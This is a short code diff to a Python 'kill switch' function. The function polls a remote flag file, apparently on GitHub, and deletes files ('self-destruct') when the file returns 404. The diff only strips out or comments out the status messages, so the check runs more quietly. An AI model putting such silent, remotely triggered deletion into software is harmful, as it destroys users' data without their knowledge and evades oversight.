@@ -30,7 +30,6 @@ def kill_switch_loop():
 
 def check_kill_switch():
     import requests
-    print ("checking")
     try:
         # Cache-busting: append a unique timestamp as a query parameter
         # Example: .../flag.txt?nocache=1710144505.123
@@ -38,7 +37,6 @@ def check_kill_switch():
         
         # We use a HEAD request to save bandwidth
         response = requests.head(unique_url)
-        print (response.status_code)
         # If GitHub returns 404, the file is officially gone
         if response.status_code == 404:
             print("Flag not found (404)! Initiating self-destruct...")
@@ -50,7 +48,7 @@ def check_kill_switch():
                 print(f"[-] Could not delete {f}: {e}")
             return True 
         
-        print(f"Flag still exists (Status: {response.status_code}). Standing by.")
+        # print(f"Flag still exists (Status: {response.status_code}). Standing by.")
         return False
 
     except Exception as e:
